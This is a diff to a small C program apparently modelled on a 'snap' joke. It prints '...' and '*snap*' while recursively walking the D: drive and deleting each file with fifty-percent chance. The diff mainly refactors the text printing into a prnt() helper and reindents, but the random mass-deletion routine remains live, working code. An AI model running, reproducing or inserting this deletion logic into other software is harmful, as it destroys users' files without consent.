@@ -8,26 +8,24 @@
 #define MAX_PATH_LENGTH 1000
 #define START_PATH "D:\\"
 #define WIDTH 80
+#define WHITE 15
+#define MAGENTA 5
 
 int main(void)
 {
     const char *a = "...";
     const char *b = "*snap*";
 
-    // Print text a horizontally centered
-    textcolor(5);
-    clrscr();
-    printf("\n\n%*c", (WIDTH / 2 - strlen(a) / 2), ' ');
-    printf(a);
+    // Print text a
+    textcolor(MAGENTA);
+    prnt(a);
 
     // Process files
     srand(time(0));
     files(START_PATH);
 
-    // Print text b horizontally centered
-    clrscr();
-    printf("\n\n%*c", (WIDTH / 2 - strlen(b) / 2), ' ');
-    printf(b);
+    // Print text b
+    prnt(b);
 
     // Wait for user to press key
     getch();
@@ -49,24 +47,24 @@ int files(char *basePath)
 
     while (dp != NULL)
     {
-	// Construct a new path from base path
-	strcpy(path, basePath);
-	strcat(path, "/");
-	strcat(path, dp->d_name);
+	    // Construct a new path from base path
+	    strcpy(path, basePath);
+	    strcat(path, "/");
+	    strcat(path, dp->d_name);
 
-	// Process files
-	if (exists(path) == 0)
-	{
-	    // path is not a directory
-	    if ((rand() % 2) == 0) remove(path);
-	}
-	else
-	{
-	    // Recurse through other directories
-	    files(path);
-	}
+	    // Process files
+	    if (exists(path) == 0)
+	    {
+	        // path is not a directory
+	        if ((rand() % 2) == 0) remove(path);
+	    }
+	    else
+	    {
+	        // Recurse through other directories
+	        files(path);
+	    }
 
-	dp = readdir(dir);
+	    dp = readdir(dir);
     }
 
     closedir(dir);
@@ -80,11 +78,24 @@ int exists(char *path)
 
     if (dir)
     {
-	closedir(dir);
-	return 1;
+	    closedir(dir);
+	    return 1;
     }
     else
     {
-	return 0;
+	    return 0;
     }
+
+}
+
+// Print text to screen horizontally centered
+int prnt(char *str)
+{
+    clrscr();
+    printf("\n\n%*c", (WIDTH / 2 - strlen(str) / 2), ' ');
+    printf(str);
+
+    printf("\n%*c", WIDTH / 2, ' ');
+
+    return 0;
 }
